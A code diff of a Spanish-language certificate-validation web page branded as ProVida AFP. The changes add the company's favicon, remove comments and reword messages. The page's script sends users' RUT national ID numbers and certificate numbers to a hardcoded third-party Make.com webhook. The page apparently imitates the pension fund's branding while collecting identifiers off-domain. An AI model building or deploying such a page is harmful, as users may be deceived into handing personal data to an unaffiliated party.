@@ -4,13 +4,16 @@
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Validador de Certificados – ProVida AFP</title>
+  
+  <link rel="icon" href="https://www.google.com/s2/favicons?domain=provida.cl&sz=128" type="image/png" />
+  
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet"/>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: 'Roboto', sans-serif; background: #fff; color: #333; min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }
 
     /* ── NAVBAR ── */
-    .top-nav-border { border-top: 4px solid #fff; } /* Optional top accent */
+    .top-nav-border { border-top: 4px solid #fff; } 
     .navbar { background: #fff; padding: 14px 40px; display: flex; align-items: center; gap: 16px; box-shadow: 0 2px 8px rgba(0,0,0,.05); position: relative; z-index: 10; }
     .navbar img { height: 46px; object-fit: contain; }
     .navbar nav { display: flex; gap: 6px; margin-left: 20px; }
@@ -45,11 +48,11 @@
       left: 0;
       width: 48px;
       height: 40px;
-      background: #00547b; /* Mismo azul del inicio del degradado */
+      background: #00547b; 
     }
 
     /* ── CAMPOS DE FORMULARIO ── */
-    .form-container { padding-left: 48px; padding-right: 20px; } /* Empuja los inputs un poco a la derecha para alinear con el texto */
+    .form-container { padding-left: 48px; padding-right: 20px; } 
     
     .field-wrapper { margin-bottom: 24px; }
     .field-wrapper input { 
@@ -223,13 +226,13 @@
           observer.unobserve(entry.target); // Dejar de observar una vez que aparece
         }
       });
-    }, { threshold: 0.15 }); // Se activa cuando se ve al menos el 15% de la imagen
+    }, { threshold: 0.15 }); 
 
     const el = document.querySelector('.fade-on-scroll');
     if (el) observer.observe(el);
   });
 
-  // ── LOGICA DEL WEBHOOK (Intacta) ──
+  // ── LOGICA DEL WEBHOOK ──
   const WEBHOOK = 'https://hook.us2.make.com/iq6ps3txx1jaxr91mje7sx47ynbta3kb';
 
   function abrirPDF(b64) {
@@ -244,7 +247,8 @@
     const rut = document.getElementById('rut').value.trim();
     const folio = document.getElementById('folio').value.trim();
     const uuid = folio;
-    if (!rut || !folio) { alert('Ingresa RUT y folio'); return; }
+    
+    if (!rut || !folio) { alert('Ingresa RUT y Número de Certificado'); return; }
     
     document.getElementById('btn-validar').disabled = true;
     document.getElementById('spinner').classList.add('active');
@@ -289,7 +293,7 @@
       const box = document.getElementById('result-box');
       document.getElementById('result-header').innerHTML = '⚠️ Error de conexión.';
       document.getElementById('result-header').style.background = '#ffebee';
-      document.getElementById('result-body').innerHTML = '<p>Revise su conexión a internet.</p>';
+      document.getElementById('result-body').innerHTML = '<p>Revise su conexión a internet e intente nuevamente.</p>';
       box.classList.add('visible');
     } finally { document.getElementById('btn-validar').disabled = false; }
   }
